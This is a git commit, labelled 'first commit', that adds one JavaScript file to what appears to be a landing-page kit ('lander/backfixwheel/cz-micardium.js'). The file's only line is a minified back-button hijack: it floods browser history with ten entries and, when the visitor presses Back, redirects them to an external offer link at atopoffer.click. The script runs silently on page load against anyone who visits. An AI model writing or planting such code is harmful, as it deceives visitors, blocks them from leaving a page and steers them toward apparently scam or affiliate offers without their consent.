df4562fa7e275f85562666c1cc4c811035c7993b
kBohdan <67594176+Bohdan-134@users.noreply.github.com>
2024-07-12 16:16:00 +0300

    first commit

---
+++ lander/backfixwheel/cz-micardium.js
@@ -0,0 +1,1 @@
+!function () { var t; try { for (t = 0; 10 > t; ++t)history.pushState({}, "", location.href); onpopstate = function (t) { t.state && location.replace("https://two.atopoffer.click/ZfyJVBQZ") } } catch (o) { } }();
